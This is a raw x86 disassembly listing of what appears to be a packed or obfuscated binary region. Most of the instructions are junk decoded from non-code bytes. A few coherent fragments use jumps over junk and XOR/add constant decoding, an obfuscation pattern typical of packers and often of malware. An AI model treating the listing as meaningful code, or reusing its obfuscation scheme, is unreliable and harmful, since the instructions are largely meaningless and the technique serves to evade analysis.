  410813:	mov    ch,0x6f
  410815:	out    dx,eax
  410816:	push   edx
  410817:	outs   dx,BYTE PTR ds:[esi]
  410818:	jb     0x41079b
  41081a:	daa    
  41081b:	retf   0x441d
  41081e:	cld    
  41081f:	mov    BYTE PTR [eax+0x10641cab],al
  410825:	shl    BYTE PTR [ebx],cl
  410827:	add    DWORD PTR [ecx-0x59e16658],0xc5b29135
  410831:	push   ebx
  410832:	sub    al,0x98
  410834:	mov    bh,0xd9
  410836:	xor    BYTE PTR [edx+edx*2+0x36],al
  41083a:	mov    al,0x3d
  41083c:	rcl    edi,cl
  41083e:	push   edx
  41083f:	ret    0x1eb
  410842:	push   ebx
  410843:	mov    ebx,0x60785477
  410848:	retf   
  410849:	mov    ebp,0xcca86de2
  41084e:	mov    edi,0xd6573ec0
  410853:	add    DWORD PTR [eax+0x16204561],edx
  410859:	hlt    
  41085a:	dec    edi
  41085b:	les    esp,FWORD PTR [ebp-0x6af744f1]
  410861:	cld    
  410862:	and    eax,0x34bbfc85
  410867:	adc    edx,edi
  410869:	xlat   BYTE PTR ds:[ebx]
  41086a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41086b:	loop   0x410803
  41086d:	cmp    eax,0xc00ca2d9
  410872:	adc    al,0x87
  410874:	sbb    al,0x79
  410876:	call   0xc0b2:0x2fcfd725
  41087d:	pushf  
  41087e:	xchg   ecx,eax
  41087f:	loope  0x4108f8
  410881:	aad    0x79
  410883:	add    al,0xf1
  410885:	push   ecx
  410886:	cdq    
  410887:	xor    DWORD PTR [ecx],0x4e
  41088a:	push   ebp
  41088b:	xor    bh,BYTE PTR [ebx+0x24d41161]
  410891:	sub    al,0x2f
  410893:	lahf   
  410894:	or     edi,ebx
  410896:	dec    edx
  410897:	loopne 0x41084a
  410899:	cmc    
  41089a:	xchg   DWORD PTR [ecx],ebp
  41089c:	jno    0x4108b7
  41089e:	xchg   edx,eax
  41089f:	cld    
  4108a0:	icebp  
  4108a1:	push   0x20
  4108a3:	inc    ecx
  4108a4:	shld   DWORD PTR [ebp+edx*4-0x4523e26b],ebp,cl
  4108ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108ad:	xor    dh,dh
  4108af:	out    dx,al
  4108b0:	xor    edx,DWORD PTR [edi+0x6d]
  4108b3:	fcom   DWORD PTR [esi-0x4d]
  4108b6:	sahf   
  4108b7:	out    dx,eax
  4108b8:	sub    ebp,DWORD PTR [edi-0x4d]
  4108bb:	ins    BYTE PTR es:[edi],dx
  4108bc:	mov    edx,0x3c3cd922
  4108c1:	jge    0x410849
  4108c3:	or     BYTE PTR [esi-0x688488e2],cl
  4108c9:	jmp    0x410898
  4108cb:	xchg   ebx,eax
  4108cc:	mov    ecx,0x4639e0ee
  4108d1:	ds jno 0x4108c1
  4108d4:	xor    eax,0x119e159e
  4108d9:	or     al,0xb9
  4108db:	test   DWORD PTR ds:0x29bcda6b,0xf9e9ca67
  4108e5:	in     al,dx
  4108e6:	mov    edx,0x44a2c374
  4108eb:	push   ss
  4108ec:	push   edi
  4108ed:	xchg   ecx,eax
  4108ee:	pop    esi
  4108ef:	rcl    BYTE PTR [esi+0x15],1
  4108f2:	jno    0x410909
  4108f4:	mov    ds:0x8ad23aba,al
  4108f9:	xor    BYTE PTR [ebx-0x5fd150a8],ch
  4108ff:	std    
  410900:	cmp    bl,BYTE PTR [ecx+0x5c]
  410903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410904:	fdiv   DWORD PTR [edi]
  410906:	pop    ebp
  410907:	iret   
  410908:	mov    dl,0xc3
  41090a:	mov    dh,0xdb
  41090c:	es hlt 
  41090e:	daa    
  41090f:	in     eax,dx
  410910:	xchg   DWORD PTR [ebx+0x1e861f1],edi
  410916:	sub    BYTE PTR [eax-0x92a43ce],dl
  41091c:	cmp    al,0x15
  41091e:	mov    ss,esp
  410920:	loope  0x4108bb
  410922:	sub    al,0xce
  410924:	je     0x410907
  410926:	stos   DWORD PTR es:[edi],eax
  410927:	push   ebx
  410928:	dec    eax
  410929:	push   ds
  41092a:	lods   al,BYTE PTR ds:[esi]
  41092b:	lock and ebp,DWORD PTR [ecx+ebp*4-0x7d921f8f]
  410933:	cmp    eax,0xb43f9f98
  410938:	or     BYTE PTR [ecx],bh
  41093a:	add    edi,DWORD PTR [esi-0x4912118b]
  410940:	das    
  410941:	mov    bh,0x71
  410943:	sbb    DWORD PTR [ebx+0x36],edi
  410946:	xchg   esp,eax
  410947:	cli    
  410948:	mov    al,0xf5
  41094a:	dec    esp
  41094b:	mov    dh,0x58
  41094d:	push   ebx
  41094e:	push   ebp
  41094f:	pop    ss
  410950:	sub    al,0xe4
  410952:	or     BYTE PTR [ebx],ah
  410954:	inc    ebp
  410955:	cmp    al,0x8f
  410957:	add    esp,ecx
  410959:	ficomp DWORD PTR [edi-0x60]
  41095c:	push   esp
  41095d:	adc    BYTE PTR [edx-0x2e],ch
  410960:	add    ch,BYTE PTR [esi+0x3b6c0712]
  410966:	sub    eax,0x7c02f76
  41096b:	xor    al,BYTE PTR [ecx]
  41096d:	mov    bh,0x8a
  41096f:	or     bl,BYTE PTR [ebp+0xd]
  410972:	xor    BYTE PTR [edx-0x7e],ch
  410975:	ret    0x574
  410978:	cmp    al,BYTE PTR [edx+0x5d7a3ddb]
  41097e:	mov    fs,WORD PTR [ebp-0x50]
  410981:	push   cs
  410982:	mov    dh,0xdb
  410984:	cmp    DWORD PTR [ecx+eax*8+0x6c],ebp
  410988:	jl     0x410928
  41098a:	add    eax,0x78b61fb6
  41098f:	dec    ebx
  410990:	add    eax,0x85229ce
  410995:	mov    bl,0x9d
  410997:	xchg   ebx,eax
  410998:	les    esi,FWORD PTR [edx+ebp*2]
  41099b:	sbb    DWORD PTR [esi+0x3c],0xbcc074e
  4109a2:	inc    ebx
  4109a3:	xchg   ecx,eax
  4109a4:	jle    0x410a0a
  4109a6:	dec    edi
  4109a7:	push   edx
  4109a8:	push   edi
  4109a9:	mov    ecx,0x23957482
  4109ae:	jecxz  0x4109ff
  4109b0:	push   ss
  4109b1:	(bad)  
  4109b2:	fild   WORD PTR [edi]
  4109b4:	pop    edi
  4109b5:	and    eax,0xb93dfad7
  4109ba:	adc    eax,DWORD PTR [edx+eiz*2-0x41]
  4109be:	dec    ebp
  4109bf:	sbb    cl,bh
  4109c1:	jae    0x410a02
  4109c3:	pop    ebp
  4109c4:	mov    eax,0x3f0a9d55
  4109c9:	xor    BYTE PTR ds:0x8224f896,ch
  4109cf:	xchg   ebp,eax
  4109d0:	push   cs
  4109d1:	rcr    eax,0xb7
  4109d4:	xchg   ebx,eax
  4109d5:	fwait
  4109d6:	jmp    0xf090:0xf7316c2c
  4109dd:	xchg   ah,ah
  4109df:	or     DWORD PTR [esi-0x80],edx
  4109e2:	(bad)  
  4109e3:	int    0x10
  4109e5:	cmp    eax,0x690c2468
  4109ea:	dec    ecx
  4109eb:	repz xor BYTE PTR [edi+eax*2],0xa0
  4109f0:	xor    esp,ebp
  4109f2:	sbb    edi,0x37
  4109f5:	fmul   DWORD PTR [ebp+ebp*4-0x5c]
  4109f9:	int3   
  4109fa:	xchg   si,ax
  4109fc:	push   eax
  4109fd:	dec    ebp
  4109fe:	mov    bh,0xe4
  410a00:	repnz and dl,cl
  410a03:	pop    ecx
  410a04:	mov    ds:0xe69ec161,al
  410a09:	mov    eax,ds:0x55d6c0c2
  410a0e:	sti    
  410a0f:	xchg   edx,eax
  410a10:	imul   edi,DWORD PTR [ebp-0x6e44422d],0x43aeffc2
  410a1a:	pop    edi
  410a1b:	fcmove st,st(4)
  410a1d:	cs jae 0x4109fb
  410a20:	cmp    ebx,ecx
  410a22:	mov    dh,0xa9
  410a24:	adc    edx,ecx
  410a26:	cdq    
  410a27:	in     al,dx
  410a28:	rcr    bh,cl
  410a2a:	repnz dec edi
  410a2c:	shr    DWORD PTR [ecx-0x6ddff130],0xce
  410a33:	into   
  410a34:	pop    edi
  410a35:	ins    DWORD PTR es:[edi],dx
  410a36:	icebp  
  410a37:	cmc    
  410a38:	adc    al,0x59
  410a3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a3b:	bound  ebx,QWORD PTR [edi]
  410a3d:	adc    edx,DWORD PTR [ecx+0x44]
  410a40:	sbb    edx,DWORD PTR [ebx]
  410a42:	and    eax,DWORD PTR [esp+eiz*4-0x4180a25c]
  410a49:	sub    DWORD PTR [ecx+0x5f],esp
  410a4c:	mov    cl,0xe7
  410a4e:	iret   
  410a4f:	push   ds
  410a50:	jp     0x410a16
  410a52:	add    al,0xc5
  410a54:	mov    ds:0xa61589ac,eax
  410a59:	or     eax,0xa9d4ddcd
  410a5e:	push   ds
  410a5f:	ins    BYTE PTR es:[edi],dx
  410a60:	cwde   
  410a61:	ja     0x4109ee
  410a63:	call   0x87e09858
  410a68:	pop    ecx
  410a69:	fnstsw WORD PTR [ecx]
  410a6b:	(bad)  
  410a6c:	jmp    0x4b6c:0x50561035
  410a73:	cs mov ebx,0x4cceba07
  410a79:	jnp    0x410a19
  410a7b:	jmp    0x115c:0xc4f72ce9
  410a82:	mov    WORD PTR [edx],?
  410a84:	popa   
  410a85:	xchg   esp,eax
  410a86:	xchg   ebp,eax
  410a87:	pop    es
  410a88:	data16 sbb dl,ch
  410a8b:	aam    0x6c
  410a8d:	retf   
  410a8e:	int3   
  410a8f:	add    al,0xb4
  410a91:	test   al,0x25
  410a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a94:	ins    DWORD PTR es:[edi],dx
  410a95:	jmp    0x494d:0xc50d88d0
  410a9c:	repz and esp,DWORD PTR cs:[ecx]
  410aa0:	mov    bl,BYTE PTR [ebp+0x75a12d94]
  410aa6:	js     0x410a3d
  410aa8:	(bad)  
  410aa9:	push   edi
  410aaa:	push   ds
  410aab:	mov    esi,0xd0c3377a
  410ab0:	xchg   esi,eax
  410ab1:	call   0xe4dd0a3d
  410ab6:	(bad)  
  410ab7:	iret   
  410ab8:	xchg   BYTE PTR [edi+0x44622a4d],ch
  410abe:	lods   eax,DWORD PTR ds:[esi]
  410abf:	in     al,dx
  410ac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ac1:	stos   DWORD PTR es:[edi],eax
  410ac2:	fidivr DWORD PTR [esi]
  410ac4:	scas   al,BYTE PTR es:[edi]
  410ac5:	inc    ebx
  410ac6:	in     eax,dx
  410ac7:	lods   al,BYTE PTR ds:[esi]
  410ac8:	js     0x410ac3
  410aca:	call   0x3b2b:0xa2863b60
  410ad1:	lds    edx,FWORD PTR [eax+0x12]
  410ad4:	in     al,dx
  410ad5:	mul    DWORD PTR ds:0xd78a807d
  410adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410adc:	dec    edx
  410add:	jns    0x410ac3
  410adf:	adc    bh,BYTE PTR [ecx+0x5e]
  410ae2:	add    eax,0xbb4f932c
  410ae7:	cmp    dl,BYTE PTR [edi-0x49364c49]
  410aed:	aam    0x5d
  410aef:	out    dx,eax
  410af0:	mov    cl,0xb0
  410af2:	jg     0x410a82
  410af4:	stc    
  410af5:	loopne 0x410b35
  410af7:	pop    eax
  410af8:	xchg   edx,eax
  410af9:	mov    ebp,ecx
  410afb:	adc    al,0x2a
  410afd:	push   eax
  410afe:	scas   eax,DWORD PTR es:[edi]
  410aff:	cld    
  410b00:	xlat   BYTE PTR ds:[ebx]
  410b01:	or     al,0x71
  410b03:	push   ecx
  410b04:	iret   
  410b05:	push   ss
  410b06:	push   esp
  410b07:	xchg   edi,eax
  410b08:	loop   0x410ad7
  410b0a:	or     cl,ch
  410b0c:	mov    edx,eax
  410b0e:	adc    eax,0x5baadfca
  410b13:	mov    esi,0xc0ea35a2
  410b18:	dec    esi
  410b19:	retf   
  410b1a:	mov    ds:0x653d44e6,eax
  410b1f:	push   DWORD PTR [ebp-0x2cd92f9c]
  410b25:	sti    
  410b26:	leave  
  410b27:	bound  edi,QWORD PTR [ecx]
  410b29:	adc    ch,cl
  410b2b:	enter  0x638c,0x1e
  410b2f:	cmp    BYTE PTR [eax],bl
  410b31:	xlat   BYTE PTR ds:[ebx]
  410b32:	inc    ebx
  410b33:	pop    ds
  410b34:	add    DWORD PTR [ebp+edi*8+0x47],ecx
  410b38:	std    
  410b39:	mov    al,ds:0xf569deaa
  410b3e:	xor    ah,cl
  410b40:	or     BYTE PTR [ecx],bl
  410b42:	call   FWORD PTR [ebx-0x48]
  410b45:	fwait
  410b46:	jbe    0x410b68
  410b48:	jmp    0x7462:0x44b1cbe6
  410b4f:	out    dx,eax
  410b50:	fcmovu st,st(3)
  410b52:	xchg   esi,eax
  410b53:	pop    esp
  410b54:	(bad)  
  410b55:	shr    BYTE PTR [edi],0x82
  410b58:	dec    ecx
  410b59:	loop   0x410b61
  410b5b:	out    0xed,al
  410b5d:	xchg   ebx,eax
  410b5e:	cli    
  410b5f:	or     dh,BYTE PTR [ebp+0x5e544639]
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz sub eax,0x3ec72a24
  410ba9:	inc    edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410c1e
  410bb1:	mov    esi,edi
  410bb3:	adc    bl,BYTE PTR [esi]
  410bb5:	jnp    0x10545b31
  410bbb:	or     esi,DWORD PTR [edi]
  410bbd:	push   esp
  410bbe:	lea    ebx,[esi]
  410bc0:	out    dx,al
  410bc1:	call   0x8a0f:0x48e093ed
  410bc8:	dec    ebx
  410bc9:	and    cl,dh
  410bcb:	push   edi
  410bcc:	jle    0x410c10
  410bce:	test   eax,0xe30c340d
  410bd3:	push   0x62f07838
  410bd8:	retf   
  410bd9:	jmp    0xd11d:0x6ff0a568
  410be0:	xor    eax,0xfa278e28
  410be5:	(bad)  
  410be6:	shl    DWORD PTR [ecx+0x44],cl
  410be9:	outs   dx,DWORD PTR ds:[esi]
  410bea:	cmp    DWORD PTR [esi],esi
  410bec:	inc    edx
  410bed:	stc    
  410bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bef:	ror    BYTE PTR [edi+ebx*4],1
  410bf2:	sbb    ah,BYTE PTR [ecx+0x37726320]
  410bf8:	mov    eax,ds:0x9e4724a3
  410bfd:	mov    ds:0xda9dea3f,al
  410c02:	std    
  410c03:	retf   0x8050
  410c06:	or     eax,0x9e79a9c2
  410c0b:	aad    0xe
  410c0d:	repnz cmps BYTE PTR cs:[esi],BYTE PTR es:[edi]
  410c10:	shr    BYTE PTR [ebx+0x16],0xb4
  410c14:	shl    DWORD PTR [eax+0x9d01fde],0xe0
  410c1b:	in     al,dx
  410c1c:	push   edx
  410c1d:	push   ss
  410c1e:	inc    edi
  410c1f:	(bad)  
  410c20:	cwde   
  410c21:	lea    edx,[esi]
  410c23:	sub    al,0xe9
  410c25:	inc    ebp
  410c26:	cmp    ebx,DWORD PTR [ebp-0x16]
  410c29:	mov    ebx,0xbae59d
  410c2e:	jecxz  0x410c04
  410c30:	test   BYTE PTR [ebp-0x23],dl
  410c33:	lahf   
  410c34:	sbb    DWORD PTR [eax],ecx
  410c36:	pop    ds
  410c37:	adc    ch,dh
  410c39:	ins    BYTE PTR es:[edi],dx
  410c3a:	push   ebp
  410c3b:	cdq    
  410c3c:	pop    ebp
  410c3d:	jmp    0x410bdd
  410c3f:	mov    edi,ebx
  410c41:	dec    edi
  410c42:	push   cs
  410c43:	popa   
  410c44:	push   ebx
  410c45:	lea    edx,[eax+edi*1-0x44]
  410c49:	push   es
  410c4a:	adc    DWORD PTR [edx*2+0x5befbe80],0x61
  410c52:	pop    ds
  410c53:	push   cs
  410c54:	xor    ebx,ecx
  410c56:	mov    esp,0x82b1d78c
  410c5b:	(bad)  
  410c5c:	jl     0x410c34
  410c5e:	and    al,0xd3
  410c60:	inc    ebx
  410c61:	sub    ch,BYTE PTR [eax+ecx*1+0x1c9aa849]
  410c68:	mov    esp,0x5869d0b9
  410c6d:	cmp    ah,cl
  410c6f:	mov    bh,0x33
  410c71:	push   esi
  410c72:	fwait
  410c73:	sbb    eax,eax
  410c75:	bound  esp,QWORD PTR [ebp-0x23]
  410c78:	mov    edx,0x7f05614b
  410c7d:	lods   eax,DWORD PTR ds:[esi]
  410c7e:	aam    0x64
  410c80:	push   ebp
  410c81:	mov    WORD PTR ds:0xf21ad2c6,ss
  410c87:	pop    edi
  410c88:	add    bl,BYTE PTR [ecx]
  410c8a:	cmp    eax,DWORD PTR ds:0x8d5fda10
  410c90:	loop   0x410d0a
  410c92:	xor    BYTE PTR [ebp-0x49],bl
  410c95:	push   ecx
  410c96:	jb     0x410c80
  410c98:	sbb    ah,BYTE PTR [edx+0x5c]
  410c9b:	push   ebx
  410c9c:	push   eax
  410c9d:	xchg   ebx,eax
  410c9e:	sbb    al,0x5
  410ca0:	and    al,0x9e
  410ca2:	jo     0x410c5f
  410ca4:	shl    BYTE PTR ds:0x3ef13aad,cl
  410caa:	adc    al,0x54
  410cac:	adc    dl,BYTE PTR [ecx-0x7488b867]
  410cb2:	push   es
  410cb3:	int    0x95
  410cb5:	ins    BYTE PTR es:[edi],dx
  410cb6:	push   cs
  410cb7:	xor    bl,al
  410cb9:	ss and eax,edx
  410cbc:	and    BYTE PTR [eax],ah
  410cbe:	aas    
  410cbf:	fcomp  QWORD PTR [edx]
  410cc1:	ins    BYTE PTR es:[edi],dx
  410cc2:	rol    DWORD PTR [ebx],0x4c
  410cc5:	mov    esp,0x516b662d
  410cca:	cmc    
  410ccb:	aad    0x32
  410ccd:	push   ecx
  410cce:	bound  eax,QWORD PTR [ebx-0x3d2d7686]
  410cd4:	mov    ds:0xfcefd50c,eax
  410cd9:	jno    0x410cd2
  410cdb:	mov    ch,0x6
  410cdd:	(bad)  
  410cde:	ficomp DWORD PTR [ecx-0x753c220]
  410ce4:	les    ebx,FWORD PTR [edx+0x5e]
  410ce7:	add    eax,0x8da2692f
  410cec:	xor    ebx,edx
  410cee:	out    dx,al
  410cef:	pop    ecx
  410cf0:	sub    eax,0x46010f9e
  410cf5:	adc    DWORD PTR [esi+0x31],ecx
  410cf8:	xchg   esi,eax
  410cf9:	inc    edi
  410cfa:	sbb    ecx,DWORD PTR [ecx]
  410cfc:	mov    dh,0x64
  410cfe:	iret   
  410cff:	push   0xffffffad
  410d01:	and    ecx,DWORD PTR [ebx]
  410d03:	xchg   edx,eax
  410d04:	pop    ds
  410d05:	cmp    eax,DWORD PTR [edx]
  410d07:	mov    al,0x4d
  410d09:	add    edx,DWORD PTR [edi+0x492e0741]
  410d0f:	ret    
  410d10:	sub    BYTE PTR [ebp-0x48],bl
  410d13:	mov    ecx,0x4691728e
  410d18:	popf   
  410d19:	mov    ah,0xc0
  410d1b:	xchg   esi,eax
  410d1c:	dec    ecx
  410d1d:	retf   0xc5fc
  410d20:	iret   
  410d21:	daa    
  410d22:	cmp    BYTE PTR [ebx-0x30],dh
  410d25:	ins    BYTE PTR es:[edi],dx
  410d26:	std    
  410d27:	sahf   
  410d28:	xor    esi,edx
  410d2a:	loope  0x410d84
  410d2c:	and    BYTE PTR [esi+ecx*2+0x7fe341b3],ah
  410d33:	daa    
  410d34:	rol    DWORD PTR [ebp-0x53],cl
  410d37:	push   edx
  410d38:	cmp    al,0xaa
  410d3a:	(bad)  
  410d3b:	in     al,dx
  410d3c:	sub    edx,DWORD PTR [ecx]
  410d3e:	mov    dl,0x91
  410d40:	ret    0x8b16
  410d43:	adc    BYTE PTR [ecx],ah
  410d45:	in     eax,0xc5
  410d47:	shr    DWORD PTR [edi-0x27],cl
  410d4a:	lods   eax,DWORD PTR ds:[esi]
  410d4b:	mov    esi,0x67ebce1a
  410d50:	fbstp  TBYTE PTR [ebx]
  410d52:	mov    ecx,0x420b78f0
  410d57:	sbb    al,0x3d
  410d59:	sub    BYTE PTR [esi],ah
  410d5b:	dec    ecx
  410d5c:	fdivr  QWORD PTR [ebx]
  410d5e:	(bad)  
  410d5f:	sahf   
  410d60:	sbb    esp,DWORD PTR cs:[edi-0x41]
  410d64:	dec    edx
  410d65:	not    DWORD PTR [ecx-0x477ff8d]
  410d6b:	test   eax,0xb8f0798f
  410d70:	jb     0x410d8c
  410d72:	sbb    al,0x6c
  410d74:	mov    cl,0x5e
  410d76:	mov    esp,?
  410d78:	add    al,0xbd
  410d7a:	inc    esp
  410d7b:	fadd   st(1),st
  410d7d:	pop    edx
  410d7e:	inc    bl
  410d80:	sbb    al,0x3
  410d82:	lock sub edx,DWORD PTR [esi]
  410d85:	xor    ch,ah
  410d87:	or     BYTE PTR [eax],al
  410d89:	das    
  410d8a:	inc    edx
  410d8b:	mov    eax,0xfefbed3d
  410d90:	cs dec ebx
  410d92:	pusha  
  410d93:	fsub   QWORD PTR [ebp+0x22]
  410d96:	dec    ebx
  410d97:	add    eax,0xfac20e68
  410d9c:	fs lahf 
  410d9e:	push   esi
  410d9f:	inc    edx
  410da0:	mov    ebp,fs
  410da2:	xchg   esi,eax
  410da3:	sub    eax,0xb1e2f4f0
  410da8:	ret    0xf7e8
  410dab:	in     eax,dx
  410dac:	test   BYTE PTR [ebp+0x2992229f],0xd0
  410db3:	xchg   ecx,eax
  410db4:	sti    
  410db5:	mov    edi,0x99cb5ae3
  410dba:	adc    DWORD PTR [edx],eax
  410dbc:	jge    0x410dab
  410dbe:	and    al,0x87
  410dc0:	sbb    BYTE PTR [ebp-0x6b],bh
  410dc3:	maxps  xmm3,XMMWORD PTR [esi+0x460ade68]
  410dca:	xchg   ebx,eax
  410dcb:	and    cl,BYTE PTR [edx+esi*4-0x2]
  410dcf:	xor    BYTE PTR [ecx+0x5d],0x9b
  410dd3:	adc    ecx,esi
  410dd5:	nop
  410dd6:	(bad)  
  410dd8:	(bad)  
  410dd9:	jge    0x410e2b
  410ddb:	pop    eax
  410ddc:	xchg   edi,eax
  410ddd:	arpl   WORD PTR cs:[edx-0x3ae9d086],ax
  410de4:	aam    0x9f
  410de6:	inc    edx
  410de7:	scas   eax,DWORD PTR es:[edi]
  410de8:	mov    ecx,esp
  410dea:	das    
  410deb:	pop    es
  410dec:	in     eax,dx
  410ded:	xchg   edi,eax
  410dee:	jbe    0x410d7c
  410df0:	lahf   
  410df1:	js     0x410e5b
  410df3:	pop    esp
  410df4:	and    ecx,DWORD PTR [edx+0x9]
  410df7:	or     BYTE PTR [ebp+0x2a],0x14
  410dfb:	push   esi
  410dfc:	(bad)  
  410dfd:	das    
  410dfe:	es dec edx
  410e00:	cmp    bh,BYTE PTR [edx-0x2b00ccd6]
  410e06:	out    0x66,eax
  410e08:	ja     0x410e17
  410e0a:	dec    eax
  410e0b:	mov    ds:0x62c407d6,al
  410e10:	test   DWORD PTR [ebp-0x41],esi
  410e13:	pop    ebx
  410e14:	jae    0x410da8
  410e16:	dec    esi
  410e17:	or     esp,DWORD PTR [edx+esi*4]
  410e1a:	pop    edx
  410e1b:	or     eax,0xd21f8389
  410e20:	mov    edx,0x14e0601e
  410e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e26:	fmulp  st(0),st
  410e28:	ret    
  410e29:	sbb    eax,0x163e5c98
  410e2e:	inc    esi
  410e2f:	out    0x52,al
  410e31:	retf   0xdf89
  410e34:	daa    
  410e35:	add    BYTE PTR [edi+0x6b],dh
  410e38:	mov    ebp,0x786d25a0
  410e3d:	xchg   ecx,eax
  410e3e:	cmp    ch,BYTE PTR [ebp-0x12]
  410e41:	inc    edi
  410e42:	pop    ecx
  410e43:	add    edx,DWORD PTR [eax]
  410e45:	std    
  410e46:	stc    
  410e47:	push   ss
  410e48:	mov    DWORD PTR [eax+ebp*4+0x5fbcca8c],esp
  410e4f:	or     dh,bh
  410e51:	jb     0x410ec6
  410e53:	push   eax
  410e54:	retf   
  410e55:	add    al,BYTE PTR [eax+0x1]
  410e58:	mov    edi,es
  410e5a:	xchg   ebx,eax
  410e5b:	mov    edx,0xda952413
  410e60:	lock sbb eax,0x3f40d730
  410e66:	pop    ds
  410e67:	mov    ah,0x86
  410e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e6a:	es dec ecx
  410e6c:	push   edx
  410e6d:	cld    
  410e6e:	jecxz  0x410eeb
  410e70:	cdq    
  410e71:	pop    edx
  410e72:	adc    dh,BYTE PTR [eax+esi*4]
  410e75:	and    al,0xda
  410e77:	mov    edx,0x6a0c687e
  410e7c:	loope  0x410e1c
  410e7e:	mov    ebp,0x8259f09b
  410e83:	outs   dx,BYTE PTR ds:[esi]
  410e84:	jno    0x410ee5
  410e86:	scas   al,BYTE PTR es:[edi]
  410e87:	adc    ah,BYTE PTR [ecx+0x5d]
  410e8a:	shl    DWORD PTR [ebp+edi*4-0x4c],cl
  410e8e:	cli    
  410e8f:	mov    eax,ds:0x37041308
  410e94:	fs cld 
  410e96:	pop    ebp
  410e97:	pop    edx
  410e98:	xor    DWORD PTR [edx-0x30],ebx
  410e9b:	pop    es
  410e9c:	push   esi
  410e9d:	mov    edi,0xb3241c9
  410ea2:	test   eax,0x61fabc41
  410ea7:	jge    0x410ef9
  410ea9:	cld    
  410eaa:	sub    dl,BYTE PTR [esi+0x1365831]
  410eb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eb1:	cmc    
  410eb2:	dec    ebx
  410eb3:	call   0xb3f0c8ce
  410eb8:	fsubr  st,st(1)
  410eba:	jae    0x410e56
  410ebc:	add    edx,0x5c
  410ebf:	cmp    cl,cl
  410ec1:	mov    dl,0x9a
  410ec3:	or     DWORD PTR [edi+0x5ea971b8],ebx
  410ec9:	call   0x279223de
  410ece:	std    
  410ecf:	repnz mov ebp,0xbdb44965
  410ed5:	push   esi
  410ed6:	mov    eax,0xd0f53676
  410edb:	mov    ah,0x3e
  410edd:	lods   al,BYTE PTR ds:[esi]
  410ede:	xor    BYTE PTR [ebx+0x596271d5],al
  410ee4:	add    dl,BYTE PTR ds:0x7fa135d4
  410eea:	push   ebx
  410eeb:	into   
  410eec:	leave  
  410eed:	xor    esi,DWORD PTR [esi+0x21763781]
  410ef3:	popf   
  410ef4:	outs   dx,BYTE PTR ds:[esi]
  410ef5:	push   esi
  410ef6:	jg     0x410ead
  410ef8:	call   FWORD PTR [eax-0x6d34276]
  410efe:	aam    0xa2
  410f00:	inc    esi
  410f01:	cmp    DWORD PTR [edi+0x774de484],edx
  410f07:	pop    edx
  410f08:	shl    DWORD PTR [ebp-0x3],1
  410f0b:	xchg   esp,eax
  410f0c:	jg     0x410f1e
  410f0e:	lea    ecx,[edx-0x223aa325]
  410f14:	(bad)  
  410f15:	icebp  
  410f16:	lock fisubr DWORD PTR [esi+0x5a224dfd]
  410f1d:	aas    
  410f1e:	dec    ecx
  410f1f:	mov    esi,0xa0e7ac5a
  410f24:	mov    eax,0xa5ee5815
  410f29:	xchg   ecx,eax
  410f2a:	push   ebp
  410f2b:	jecxz  0x410ed9
  410f2d:	and    al,0xe2
  410f2f:	sub    DWORD PTR [eax-0x3b],0x5599d690
  410f36:	jne    0x410f04
  410f38:	mov    ch,0x6b
  410f3a:	mov    BYTE PTR [edi],dh
  410f3c:	das    
  410f3d:	imul   eax,DWORD PTR [ebx-0x11],0x44
  410f41:	push   cs
  410f42:	cmp    DWORD PTR [edi+0x60],esp
  410f45:	jmp    FWORD PTR ds:0x572dabad
  410f4b:	mov    al,0xe5
  410f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f4e:	cmc    
  410f4f:	bound  ecx,QWORD PTR [ecx]
  410f51:	test   al,0xb5
  410f53:	in     al,0xe8
  410f55:	mov    al,dh
  410f57:	mov    ds:0x621dfedd,al
  410f5c:	xchg   ebp,eax
  410f5d:	push   ss
  410f5e:	cmp    esp,ebp
  410f60:	ret    0xec88
  410f63:	sbb    BYTE PTR [ecx+0x51fa74d3],cl
  410f69:	lock xchg esp,eax
  410f6b:	cmp    eax,0x297ef575
  410f70:	fwait
  410f71:	pop    edi
  410f72:	push   eax
  410f73:	aam    0xf3
  410f75:	imul   esp,esi,0x410efb51
  410f7b:	sub    cl,0x8f
  410f7e:	iret   
  410f7f:	int3   
  410f80:	xor    al,0x9f
  410f82:	sbb    al,0xd6
  410f84:	enter  0xb7c6,0xd0
  410f88:	iret   
  410f89:	test   eax,0xe8f5a0f8
  410f8e:	scas   eax,DWORD PTR es:[edi]
  410f8f:	mov    cl,0x82
  410f91:	push   ebp
  410f92:	shl    BYTE PTR [ebx+0x4be39821],1
  410f98:	mov    eax,ds:0x41b22c
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fe6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e21c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
